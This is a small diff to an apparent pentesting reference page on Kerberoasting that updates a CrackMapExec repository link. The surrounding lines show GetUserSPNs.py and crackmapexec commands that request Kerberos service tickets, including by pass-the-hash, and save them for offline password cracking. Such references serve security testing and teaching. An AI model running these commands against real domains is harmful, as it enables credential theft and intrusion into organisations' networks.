@@ -38,7 +38,7 @@ GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DO
 GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
 ```
 
-This can also be achieved with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python).
+This can also be achieved with [CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python).
 
 ```bash
 crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
